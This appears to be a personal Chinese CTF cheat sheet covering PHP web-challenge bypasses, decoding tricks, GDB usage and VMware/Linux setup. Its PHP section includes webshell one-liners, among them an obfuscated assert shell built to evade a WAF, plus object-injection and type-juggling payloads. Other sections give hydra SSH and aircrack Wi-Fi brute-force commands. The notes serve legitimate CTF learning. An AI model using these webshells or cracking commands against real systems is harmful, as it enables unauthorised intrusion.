</code></pre></div><p>echo $((0x10)) # 16进制的16</p> <h4 id="dd-命令分离文件"><a href="#dd-命令分离文件" class="header-anchor">#</a> dd 命令分离文件</h4> <p>/tmp # dd if=a.bin of=c.bin bs=128k skip=18     //一个块为128K，跳过前18块。</p> <p>/tmp # dd if=a.bin of=b.bin bs=128k count=18    //bs=128k,表示一个块128k, 从文件头开始，读取18块。</p> <p>dd if=2.jpg of=2-1.jpg skip=158792 bs=1</p> <p>可以参考 dd命令详解 ，这里if是指定输入文件，of是指定输出文件，skip是指定从输入文件开头跳过158792个块后再开始复制，bs设置每次读写块的大小为1字节 。</p> <p>16进制地址分离</p> <p>dd if=logo.jpg of=2-1.jpg skip=$((0x7011)) bs=1</p> <h3 id="启动服务-mysql"><a href="#启动服务-mysql" class="header-anchor">#</a> 启动服务 mysql</h3> <p>1</p> <div class="language- extra-class"><pre><code>systemctl start mysql
</code></pre></div><p>2</p> <div class="language- extra-class"><pre><code>sudo /etc/init.d/mysql start
sudo /etc/init.d/mysql stop
sudo /etc/init.d/mysql restart
</code></pre></div><h2 id="关键字"><a href="#关键字" class="header-anchor">#</a> 关键字</h2> <p>flag
key
ctf</p> <h2 id="web"><a href="#web" class="header-anchor">#</a> Web</h2> <h3 id="基本知识"><a href="#基本知识" class="header-anchor">#</a> 基本知识</h3> <p>Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，
告诉服务器我是从哪个页面链接过来的</p> <h3 id="php"><a href="#php" class="header-anchor">#</a> php</h3> <p>未整理</p> <div class="language- extra-class"><pre><code># 注意看注释，可能有需要提交的字段 
修改上传格式， burpsuite 抓包，修改
超长数字--可能时间戳
看参数
  index.php?line=&amp;filename=a2V5cy50eHQ= ， 这里 line=数字 加 filename=[base64filename] 可以读取源码行
  尝试获取 index.php hint.php flag.php key.php
  ?txt=data://text/plain,welcome to the bugkuctf&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}

语句
  ?s=print_r(scandir('./')) , 显示当前目录文件

过狗
  &lt;?php $poc=&quot;a#s#s#e#r#t&quot;; $poc_1=explode(&quot;#&quot;,$poc); $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5]; $poc_2($_GET['s']) ?&gt;
</code></pre></div><p>审题</p> <div class="language- extra-class"><pre><code> robots.txt, 
 参数提示 x== ?? 时 =admin
</code></pre></div><p>绕过</p> <div class="language- extra-class"><pre><code>md5, sha1 相同，值又不同 ---- 空数组 k[]=1&amp;k2[]=2
jpg格式绕过:  抓包, Content-Type改成Multipart/form-data大小写绕过, 请求内容里的Content-Type改成image/jpg, 扩展名需要挨个试--除了php5都过滤了。

上传相关： 可以是值也可以是数组---在上传时写入文需要有fopen fwrite fclose等等系列函数，还有一种file_put_contents()函数，它与依次调用上面三个函数功能一样，并且还这个可以允许数组。
No No No 提示可能是数组 data参数改为 data[]
</code></pre></div><p>上传任意</p> <div class="language- extra-class"><pre><code>&lt;script language=&quot;PHP&quot;&gt;
   echo((file_get_contents('flag.'.'p'.'h'.'p')));
&lt;/script&gt;
</code></pre></div><p>变量覆盖</p> <div class="language- extra-class"><pre><code>变量shiyan和变量content的值相同： ?shiyan=&amp;flag= 
</code></pre></div><p>strcmp漏洞</p> <div class="language- extra-class"><pre><code>payload为：?a[]=123 ， php5.3 以前 传入非字符串类型的数据的时候，这个函数将发生错误，判定相等
</code></pre></div><p>php中的 md5 碰撞</p> <div class="language- extra-class"><pre><code>因为0e开头的关系，认为值是相同的。md5加密后为0e开头即可。以都均可
s878926199a,  s1885207154a,  s1836677006a,  s155964671a
</code></pre></div><h3 id="web-工具"><a href="#web-工具" class="header-anchor">#</a> Web 工具</h3> <div class="language- extra-class"><pre><code>开发者工具 ， 有些值可以在 F12-存储里 直接修改
BurpSuit 抓包 直接GET改成POST
Firefox-Hackbar
</code></pre></div><h3 id="一些-php-code"><a href="#一些-php-code" class="header-anchor">#</a> 一些 php code</h3> <div class="language- extra-class"><pre><code> filename=123.php&amp;data=&lt;?php%20@eval($_GET[&quot;code&quot;]) ?&gt;
</code></pre></div><h3 id="提示"><a href="#提示" class="header-anchor">#</a> 提示</h3> <p>##相关工具
fcrackzip -- kali暴破zip
fcrackzip -b -l 3-3 -c1 -v flag.zip # 暴破3位
Advanced Archive Password Recovery 4.53 压缩包暴破 明文攻击，加密文件</p> <h3 id="隐写"><a href="#隐写" class="header-anchor">#</a> 隐写</h3> <p>stegdetect 识别部分隐写</p> <p>不知道什么文件后，
可以直接在winhex里搜索字符
或者 grep 'key' -a filename,</p> <p>jar 解压直接搜flag</p> <h3 id="加密解密"><a href="#加密解密" class="header-anchor">#</a> 加密解密</h3> <p>RouterPassView 宽带路由器解密
mimikatz.exe 读取dmp文件。 16进制 MD MP 开头</p> <h4 id="crypto"><a href="#crypto" class="header-anchor">#</a> Crypto</h4> <p>常见加密形式</p> <div class="language- extra-class"><pre><code> 按拉偏移
 栅栏加密 等分，可能有一组密钥提示
     栅栏 f5-lf5aa9gc9{-8648cbfb4f979c-c2a851d6e5-c}
 \176 这种用 Unescape转
 &amp;#x26 --- html 解码
 ..... !?!!.  ----- ook解码
 Ook        ------- ook解码
 [-&gt;++ +++++ +++&lt;] --- brainfucks 解码
 636A56355279427363446C4A49454A7154534230526D6843 16进制转ASCii
 @iH&lt;,{bdR2H;i6*Tm,Wx2izpx2! --- 91解码
 affine ----- 仿射 https://blog.csdn.net/zz_Caleb/article/details/84184283
 root:$6$HRMJoyGA$26FIgg6*****.:17770:0:99999:7::: shadow，包含des加密。key+salt,salt是$6$HRMJoyGA$， 用Linux的join暴破 join shadow
 RC4: key welcometoicqedu 密文UUyFTj8PCzF6geFn6xgBOYSvVTrbpNU4OF9db9wMcPD1yDbaJw== 

shadow 文件, linux密码 --- 使用 john 破解
</code></pre></div><p>压缩包明文攻击：有1文件x.jpg和 .zip压缩包中都含有同样一个文件。</p> <div class="language- extra-class"><pre><code>用archpr, 选plain_text，将 x.jpg压缩成 zip(和目标同格式)。选好两个文件。点击start。
</code></pre></div><p>字典工具</p> <div class="language- extra-class"><pre><code>pwgen
xeger 
</code></pre></div><h3 id="暴力破解"><a href="#暴力破解" class="header-anchor">#</a> 暴力破解</h3> <p>`wifi
crunch 11 11 -t 1391040%%%% &gt;&gt;wifipass.txt # 生成字典
aircrack-ng -w wifipass.txt wifi.cap</p> <h2 id="hydra-sh暴破"><a href="#hydra-sh暴破" class="header-anchor">#</a> hydra sh暴破</h2> <div class="language- extra-class"><pre><code>只知道账号时  
/usr/share/wordlists 下有常用的字典
hydra -l hsj -P /usr/share/wordlists/metaploit/unix_passwords.txt ssh://192.168.232.146 # hsj用户名
</code></pre></div><h3 id="字典工具"><a href="#字典工具" class="header-anchor">#</a> 字典工具</h3> <h4 id="crunch"><a href="#crunch" class="header-anchor">#</a> crunch</h4> <p><a href="https://blog.csdn.net/qq_42025840/article/details/81125584" target="_blank" rel="noopener noreferrer">crunch<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> <code>&lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options]</code></p> <p><code>crunch 11 11 -t 1391040%%%%</code></p> <p>-t @,%^，指定模式，@,%^分别代表意义如下：</p> <div class="language- extra-class"><pre><code>@ 插入小写字母
, 插入大写字母
% 插入数字
^ 插入特殊符号          
使用实例:(当确定使用的对象类型但不具体知道是那些时可以使用占位符)
</code></pre></div><p>例1、</p> <div class="language- extra-class"><pre><code>生成缺位的手机号码(有可能作为路由器密码或wifi密码（8-11位）)
crunch 11 11   -t  1503453%%%%   -o 1.txt 或&gt;&gt; 1.txt(以%位数字占位符)
</code></pre></div><p>例二：</p> <div class="language- extra-class"><pre><code>crunch 4 4  + + 123 + -t %%@^ 
生成4位密码，其中格式为“两个数字”+“一个小写字母”+“常见符号”(其中数字这里被指定只能为123组成的所有2位数字组合)。比如12f#，32j^，13t$......
</code></pre></div><h2 id="未来学习"><a href="#未来学习" class="header-anchor">#</a> 未来学习</h2> <p>cbc字节反转攻击
pwn https://blog.csdn.net/qq_18823653/article/details/88824173</p> <p>改密码?
echo &quot;密码&quot; | passwd --stdin 用户名
echo higo#gogo | passwd --stdin hsj
echo dx$ftpQ9 | passwd --stdin ftp</p> <h3 id="awd"><a href="#awd" class="header-anchor">#</a> AWD</h3> <h4 id="靶机"><a href="#靶机" class="header-anchor">#</a> 靶机</h4> <p>FTP弱口令，flag文件
robots文件，包含后台路径，需SSL遍历后台
ssh弱口令，hsj+123;/home/hsj/flag 仅hsj可读
环境变量  /phpinfo.php
发现后台并登陆后，后台首页；心脏出血、弱口令
gv32后台管理首页；注入即可
通过菜刀可读 /root/.flag
upload目录有webshell，内有flag 散列需解密
SUID后门；须反弹shell提权，-p；/flag
内核提权，例如dirtycow；/etc/passwd--</p> <h2 id="其他"><a href="#其他" class="header-anchor">#</a> 其他</h2> <div class="language- extra-class"><pre><code>gcc编译 gcc hello.c -o hello
g++ hello.cpp -o hello
g++ hello1.cpp hello2.cpp -o hello（或makefile）
</code></pre></div><h2 id="save"><a href="#save" class="header-anchor">#</a> save</h2> <p>https://blog.csdn.net/shenzhang7331/article/details/84311280</p> <p>https://www.freebuf.com/sectool/185468.html</p> <h2 id="gdb-调试"><a href="#gdb-调试" class="header-anchor">#</a> GDB 调试</h2> <p>直接回车 表示重复上一条命令:</p> <p>q 退出</p> <p>at // attach</p> <p>b *0x400100 (b main):在 0x400100 处下断点, d [number]：删除断点, d * 删除全部</p> <div class="language- extra-class"><pre><code>b printf
b system
</code></pre></div><p>r(run)  // 运行程序</p> <p>n  //ni：单步步过
n 5 // 走5步</p> <p>s  //si：单步步入</p> <p>fin // 执行到返回</p> <p>i r // info register</p> <p>x/16wx $esp // 查看栈情况</p> <p>x/5s $eax  // 看5个 s字符串
x/5sw $eax // 看5个 s字符串 w--dword 双字</p> <p>x/200w $eax // 看eax的 200个4字节</p> <p>x/3uh 0x54320 //内存地址0x54320读取内容 3u 3w个字节</p> <p>x/3us 0x601080 //读取地址字符串</p> <p>已进入函数了 -8对齐
x/64gx $rsp-8
p 输出</p> <div class="language- extra-class"><pre><code>p __free_hook // 打印 freehook地址信息
p shel // 打印 shell
</code></pre></div><p>set <em>(char</em>)0x08048e3a = 0x74 修改汇编值</p> <p>如何查找函数三种方式</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>shell$ objdump -M intel -d <span class="token builtin class-name">test</span> <span class="token operator">|</span> <span class="token function">less</span>
shell$ objdump -T ./libc.so.6 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'read'</span>
shell$ objdump -T ./libc.so.6 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'__libc_start_main'</span>     这个在startmain前就会被call过
gdb-peda$ p shell
r2$ afl~shell
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h3 id="peda"><a href="#peda" class="header-anchor">#</a> peda</h3> <p>info file  // 查看当前文件的信息，例如程序入口点</p> <p>info b(reak) // 查看当前断点信息</p> <p>disass + main</p> <p>disassemble + func // 对指定的函数进行反汇编</p> <p>b +'地址'  // 设置断点 即break + '地址'</p> <p>b *0x400100 (b main):在 0x400100 处下断点</p> <p>c(contunue)  // 继续执行</p> <p>x /4xg $ebp：查看ebp开始的4个8字节内容（b：单字节，h：双字节，w：四字节，g：八字节；x：十六进制，s：字符串输出，i：反汇编，c：单字符）</p> <p>x / (n , f ,u) // n,f,u是其三个可选参数</p> <p>n是一个正整数，表示需要显示的内存单元的个数，也就是说从当前地址向后显示几个内存单元的内容，一个内存单元的大小由后面的u定义。</p> <p>f 表示显示的格式，参见下面。如果地址所指的是字符串，那么格式可以是s，如果地址是指令地址，那么格式可以是i。</p> <p>u 表示从当前地址往后请求的字节数，如果不指定的话，GDB默认是4个bytes。u参数可以用下面的字符来代替，b表示单字节，h表示双字节，w表示四字节，g表示八字节。当我们指定了字节长度后，GDB会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</p> <p>layout // 用于分割窗口，可以一边查看代码，一边测试。
主要有下面几种用法：</p> <p>layout src // 显示源代码窗口</p> <p>layout asm // 显示汇编窗口</p> <p>layout regs // 显示源代码/汇编和寄存器窗口</p> <p>layout split // 显示源代码和汇编窗口</p> <p>layout next // 显示下一个layout</p> <p>layout prev // 显示上一个layout</p> <p>Ctrl + L // 刷新窗口</p> <p>Ctrl + x  再按1 // 单窗口模式，显示一个窗口</p> <p>Ctrl + x  再按2 // 双窗口模式，显示两个窗口</p> <p>Ctrl + x  再按a // 回到传统模式，即退出layout，回到执行layout之前的调试窗口。</p> <p>delete [number]：删除断点</p> <p>tb一次性断点</p> <p>watch *(int *)0x08044530：在内存0x0804453处的数据改变时stop</p> <p>p $eax：输出eax的内容</p> <p>set $eax=4：修改变量值</p> <p>fini：运行至函数刚结束处</p> <p>return expression：将函数返回值指定为expression</p> <p>bt：查看当前栈帧</p> <p>info f：查看当前栈帧</p> <p>context：查看运行上下文</p> <p>stack：查看当前堆栈</p> <p>call func：强制函数调用</p> <p>ropgagdet：找common rop</p> <p>vmmap：查看虚拟地址分布</p> <p>shellcode：搜索，生成shellcode</p> <p>ptype struct link_map：查看link_map定义</p> <p>p &amp;((struct link_map*)0)-&gt;l_info：查看l_info成员偏移</p> <h3 id="gdb"><a href="#gdb" class="header-anchor">#</a> gdb</h3> <div class="language- extra-class"><pre><code>gcc gdb-sample.c -o gdb-sample -g
gdb
file gdb-sample # file 载入程序
b main # break at main
r  # run
s  # step into
ni # step next/over
(gdb) p n  # print n
c  # Continu
display /i $pc # 显示汇编指令
si  #”命令用于执行一条汇编代码——区别于“s”执行一行C代码）：

d  # Delete breakpoint）
    
    b *main # 在 main 函数的 prolog 代码处设置断点（prolog、epilog，分别表示编译器在每个函数的开头和结尾自行插入的代码）

i r”命令显示寄存器中的当前值———“i r”即“Infomation Register”：
i r eax
i b # 查看断点
q  #Quit

list &lt;linenum&gt;
• list &lt;function&gt;
• list 显示当前行后面的源码
• list -显示当前行前面的源码
 search &lt;regexp&gt;
• forward-search 向前搜索
• reverse-search 全部搜索
</code></pre></div><p>运行参数</p> <div class="language- extra-class"><pre><code>1、set args 10 20 30
• 2、run 10 20 30
• 3、gdb test -args 10 20 30
• show args
• 运行时输入数据：
• run &lt; payload.txt

watch &lt;expr&gt;
– 一旦表达式（变量）值有所变化，程序立马停住
rwatch &lt;expr&gt;
– 当expr被读时
• awatch &lt;expr&gt;
– 当expr被读或写时
• info watchpoints
• 清除停止点（break、watch、catch）
– delete、clear、disable、enable
</code></pre></div><p>修改变量值</p> <div class="language- extra-class"><pre><code>(gdb)print x=4
• (gdb)set x=4
• (gdb)set var width=10
</code></pre></div><p>跳转执行</p> <div class="language- extra-class"><pre><code>• jump
• jump &lt;linespec&gt;
• jump &lt;address&gt;
• 同样，也可以直接改变跳转执行的地址：
• set $pc=0x08041234
•

x/32gx 0x602010-0x10 命令查看堆块情况
</code></pre></div><h2 id="vmware-共享文件夹"><a href="#vmware-共享文件夹" class="header-anchor">#</a> Vmware 共享文件夹</h2> <p><a href="https://blog.csdn.net/qq_33438733/article/details/79671403" target="_blank" rel="noopener noreferrer">Link<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>查看windowns共享目录： <code>vmware-hgfsclient</code></p> <p>挂载共享目录：</p> <div class="language- extra-class"><pre><code>sudo mkdir /mnt/hgfs
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
</code></pre></div><p>挂载vmware到~/vmware</p> <div class="language- extra-class"><pre><code>mkdir ~/vmware
sudo vmhgfs-fuse .host:/vmware /home/kali/vmware -o subtype=vmhgfs-fuse,allow_other
</code></pre></div><p>查看挂载情况：</p> <div class="language- extra-class"><pre><code>[root@bogon ~]# df -T
vmhgfs-fuse             fuse.vmhgfs-fuse 179050492 32083464 146967028   18% /mnt/hgfs
</code></pre></div><p>5，设置开机启动</p> <p>sudo vi /etc/init.d/mount</p> <div class="language- extra-class"><pre><code>#! /bin/sh
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
sudo mount --bind /mnt/hgfs/vmware /home/kali/vmware
</code></pre></div><p>将<code>mount --bind /mnt/hgfs/vmware /home/kali/vmware</code>加入到<code>/etc/rc.local</code>文件中, centos7.2中开启启动需chmod +x /etc/rc.local赋给权限</p> <p>注意使用这个方法时，代码如果是复制粘贴的，需要用vim打开. \r\n的dos格式会引起错误</p> <div class="language- extra-class"><pre><code>方法1 vi xx.sh
:set ff=unix回车
wq回车

方法2
cat dbback.sh | tr &quot;\r\n&quot; &quot;\n&quot;

方法3：
sed -i 's/\r$//' file.sh
将file.sh中的\r都替换为空白，问题解决


sudo update-rc.d mount defaults 99
</code></pre></div><h3 id="添加开机项-方法1"><a href="#添加开机项-方法1" class="header-anchor">#</a> 添加开机项-方法1</h3> <div class="language- extra-class"><pre><code>sudo vi /etc/fstab
# 添加
.host:/vmware /home/kali/vmware fuse.vmhgfs-fuse   allow_other   0   0
</code></pre></div><h3 id="添加开机项-方法2"><a href="#添加开机项-方法2" class="header-anchor">#</a> 添加开机项-方法2</h3> <div class="language- extra-class"><pre><code>sudo crontab -e
# 加入
@reboot /home/kali/x.sh

# x.sh
sudo vmhgfs-fuse .host:/ /mnt/hgfs -o subtype=vmhgfs-fuse,allow_other
sudo mount --bind /mnt/hgfs/vmware /home/kali/vmware
</code></pre></div><h3 id="移除开机启动项"><a href="#移除开机启动项" class="header-anchor">#</a> 移除开机启动项</h3> <div class="language- extra-class"><pre><code>sudo update-rc.d -f mount remove
</code></pre></div><p>update-rc.d mount start 99 2 3 4 5 . stop 01 0 1 6 . #设置启动级别</p> <p>Use the <code>service --status-all</code> 也可以检查</p> <div class="language- extra-class"><pre><code>[ + ] – Services with this sign are currently running.
[ – ] – Services with this sign are not currently running..
[ ? ] – Services that do not have a status switch.
</code></pre></div><p>手动启动 systemctl start mount
自动启动 systemctl enable mount</p> <h3 id="添加开机项4"><a href="#添加开机项4" class="header-anchor">#</a> 添加开机项4</h3> <p>Had the same problem, found a solution in this post elsewhere.</p> <p>Summary:</p> <div class="language- extra-class"><pre><code>sudo vim /etc/systemd/system/rc-local.service
</code></pre></div><p>Then add the following content to it.</p> <div class="language- extra-class"><pre><code>[Unit]
 Description=/etc/rc.local Compatibility
 ConditionPathExists=/etc/rc.local

[Service]
 Type=forking
 ExecStart=/etc/rc.local start
 TimeoutSec=0
 StandardOutput=tty
 RemainAfterExit=yes
 SysVStartPriority=99

[Install]
 WantedBy=multi-user.target
Note: Starting with 16.10, Ubuntu doesn't ship with /etc/rc.local file anymore. Same thing for other distributions like Kali. You can create the file by executing this command.
</code></pre></div><p><code>printf '%s\n' '#!/bin/bash' 'exit 0' | sudo tee -a /etc/rc.local</code></p> <p>Then add execute permission to /etc/rc.local file.</p> <div class="language- extra-class"><pre><code>sudo chmod +x /etc/rc.local
</code></pre></div><p>After that, enable the service on system boot:</p> <div class="language- extra-class"><pre><code>sudo systemctl enable rc-local
</code></pre></div><p>Finally, start the service and check its status:</p> <div class="language- extra-class"><pre><code>sudo systemctl start rc-local.service
sudo systemctl status rc-local.service
</code></pre></div><p>The complete post in https://www.linuxbabe.com/linux-server/how-to-enable-etcrc-local-with-systemd</p> <h2 id="shell-脚本语法"><a href="#shell-脚本语法" class="header-anchor">#</a> Shell 脚本语法</h2> <div class="language- extra-class"><pre><code>vmware-hgfsclient | while read folder; do
    echo ${folder}
    # vm-folder1
    # vm-folder2
done
</code></pre></div><p>echo <code>pwd</code></p> <h2 id="faq"><a href="#faq" class="header-anchor">#</a> FAQ</h2> <h3 id="中文乱码"><a href="#中文乱码" class="header-anchor">#</a> 中文乱码</h3> <div class="language- line-numbers-mode"><pre class="language-text"><code>sudo apt install xfonts-intl-chinese ttf-wqy-microhei -y
sudo dpkg-reconfigure locales
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><ol><li><p>空格选中zh_CN.UTF8, 回车。</p></li> <li><p>默认设置为en_us.UTF8</p></li></ol> <h3 id="怎样离线安装软件包？"><a href="#怎样离线安装软件包？" class="header-anchor">#</a> 怎样离线安装软件包？</h3> <p>下载包文件</p> <div class="language- extra-class"><pre><code>sudo apt-get -d -y install open-vm-tools
sudo apt-get -d -y install open-vm-tools-desktop
sudo apt-get -d -y install open-vm-tools-desktop fuse
</code></pre></div><p>复制到U盘</p> <div class="language- extra-class"><pre><code>sudo cp -r /var/cache/apt/archives/* /U盘/路径/debs/
</code></pre></div><p>到无网络电脑上插U盘 创建包缓存目录</p> <div class="language- extra-class"><pre><code>$ sudo mkdir /var/debs
</code></pre></div><p>将U盘中下载好的包文件全部复制到/var/debs目录下</p> <div class="language- extra-class"><pre><code>$ sudo cp -r /U盘/路径/debs/* /var/debs/
</code></pre></div><p>生成包索引文件</p> <div class="language- extra-class"><pre><code>$ sudo touch /var/debs/Packages.gz
$ sudo chmod -R 777 /var/debs/  # 这一步是为了获得文件的可写可读可执行权限，要不然后面会失败
$ sudo dpkg-scanpackages debs  /dev/null  | gzip &gt; debs/Packages.gz  # 创建索引
</code></pre></div><p>在 /etc/apt/sources.list 中添加本地目录</p> <div class="language- extra-class"><pre><code>$ sudo gedit /etc/apt/sources.list
</code></pre></div><p>将sources.list 原来的内容都注释掉。在最后添加</p> <div class="language- extra-class"><pre><code>$ deb file:/var debs/
</code></pre></div><p>注意上面的 /var 和 debs/ 之间的空格，以及 “/”。不要写错/var/debs/路径了。</p> <p>更新索引</p> <div class="language- extra-class"><pre><code>$ sudo apt-get update
</code></pre></div><p>结束 现在可以安装包了。运行sudo apt-get install &lt;包名&gt; 就会像以前一样安装好了指定的包了。</p> <h2 id="gcc-使用"><a href="#gcc-使用" class="header-anchor">#</a> gcc 使用</h2> <p>编译与运行</p> <p>（1）简单直接的方式</p> <p>如下命令会在当前目录下生成a.out文件，使用./a.out运行</p> <div class="language- extra-class"><pre><code>gcc main.c
./main
</code></pre></div><p>（2）分步骤</p> <div class="language- extra-class"><pre><code>gcc main.c -o hello
./hello
</code></pre></div><h2 id="to-save-to-workflow"><a href="#to-save-to-workflow" class="header-anchor">#</a> TO save to workflow</h2> <p>连续输入文字到文件</p> <div class="language- extra-class"><pre><code>cat &gt; xxx &lt;&lt;EOL
a
b
c
d
EOL
</code></pre></div></div> <footer class="page-edit" style="display:none;"><!----> <!----></footer> <!----> <!----></main> <!----></div></div></div></div><div class="global-ui"><div class="back-to-ceiling" style="right:1rem;bottom:6rem;width:2.5rem;height:2.5rem;border-radius:.25rem;line-height:2.5rem;display:none;" data-v-44bd5a18 data-v-44bd5a18><svg t="1574745035067" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5404" class="icon" data-v-44bd5a18><path d="M526.60727968 10.90185116a27.675 27.675 0 0 0-29.21455937 0c-131.36607665 82.28402758-218.69155461 228.01873535-218.69155402 394.07834331a462.20625001 462.20625001 0 0 0 5.36959153 69.94390903c1.00431239 6.55289093-0.34802892 13.13561351-3.76865779 18.80351572-32.63518765 54.11355614-51.75690182 118.55860487-51.7569018 187.94566865a371.06718723 371.06718723 0 0 0 11.50484808 91.98906777c6.53300375 25.50556257 41.68394495 28.14064038 52.69160883 4.22606766 17.37162448-37.73630017 42.14135425-72.50938081 72.80769204-103.21549295 2.18761121 3.04276886 4.15646224 6.24463696 6.40373557 9.22774369a1871.4375 1871.4375 0 0 0 140.04691725 5.34970492 1866.36093723 1866.36093723 0 0 0 140.04691723-5.34970492c2.24727335-2.98310674 4.21612437-6.18497483 6.3937923-9.2178004 30.66633723 30.70611158 55.4360664 65.4791928 72.80769147 103.21549355 11.00766384 23.91457269 46.15860503 21.27949489 52.69160879-4.22606768a371.15156223 371.15156223 0 0 0 11.514792-91.99901164c0-69.36717486-19.13165746-133.82216804-51.75690182-187.92578088-3.42062944-5.66790279-4.76302748-12.26056868-3.76865837-18.80351632a462.20625001 462.20625001 0 0 0 5.36959269-69.943909c-0.00994388-166.08943902-87.32547796-311.81420293-218.6915546-394.09823051zM605.93803103 357.87693858a93.93749974 93.93749974 0 1 1-187.89594924 6.1e-7 93.93749974 93.93749974 0 0 1 187.89594924-6.1e-7z" p-id="5405" data-v-44bd5a18></path><path d="M429.50777625 765.63860547C429.50777625 803.39355007 466.44236686 1000.39046097 512.00932183 1000.39046097c45.56695499 0 82.4922232-197.00623328 82.5015456-234.7518555 0-37.75494459-36.9345906-68.35043303-82.4922232-68.34111062-45.57627738-0.00932239-82.52019037 30.59548842-82.51086798 68.34111062z" p-id="5406" data-v-44bd5a18></path></svg></div></div></div>
    <script src="/text_del/assets/js/app.019b619e.js" defer></script><script src="/text_del/assets/js/4.6ff137c7.js" defer></script><script src="/text_del/assets/js/1.9204637f.js" defer></script><script src="/text_del/assets/js/41.8a59c4b1.js" defer></script>
  </body>
</html>
